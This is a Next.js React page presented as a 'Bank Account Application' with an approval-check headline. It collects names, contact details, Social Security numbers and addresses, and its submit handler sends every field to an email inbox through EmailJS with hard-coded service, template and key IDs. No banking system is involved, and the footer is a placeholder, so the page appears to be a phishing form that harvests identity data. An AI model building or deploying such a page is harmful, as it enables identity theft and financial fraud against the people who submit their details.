import Head from "next/head";
import { useState } from "react";
import emailjs from 'emailjs-com';
import styles from "../styles/Home.module.css"; // Import the CSS module

export default function Home() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    ssn: "",
    address: "",
    city: "",
    state: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Send the form data using emailjs
    const formElement = e.target;
    const formData = new FormData(formElement);

    emailjs.sendForm('service_ozea06x', 'template_ugtxhw6', formElement, 'XMOnwjyzQDoRVRYl3')
      .then((result) => {
        console.log('Form submitted successfully:', result.text);
      }, (error) => {
        console.error('Form submission failed:', error.text);
      });
  };

  return (
    <>
      <Head>
        <title>Bank Account Application</title>
        <meta name="description" content="Apply for a bank account in the United States" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <div className={styles.container}>
        <h1 className={styles.title}>CHECK IF YOU&apos;RE APPROVED</h1>
        <div className={styles.formContainer}>
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="name">Name</label>
              <input
                type="text"
                id="name"
                name="name"
                className="form-control"
                value={formData.name}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="email">Email</label>
              <input
                type="email"
                id="email"
                name="email"
                className="form-control"
                value={formData.email}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="phone">Phone</label>
              <input
                type="tel"
                id="phone"
                name="phone"
                className="form-control"
                value={formData.phone}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="ssn">SSN</label>
              <input
                type="text"
                id="ssn"
                name="ssn"
                className="form-control"
                value={formData.ssn}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="address">Address</label>
              <input
                type="text"
                id="address"
                name="address"
                className="form-control"
                value={formData.address}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="city">City</label>
              <input
                type="text"
                id="city"
                name="city"
                className="form-control"
                value={formData.city}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="state">State</label>
              <input
                type="text"
                id="state"
                name="state"
                className="form-control"
                value={formData.state}
                onChange={handleChange}
                required
              />
            </div>
            <button type="submit" className="btn btn-primary mt-3">Submit</button>
          </form>
        </div>
      </div>
      <footer className={styles.footer}>
        <p>© 2025 Your Company. All rights reserved.</p>
      </footer>
    </>
  );
}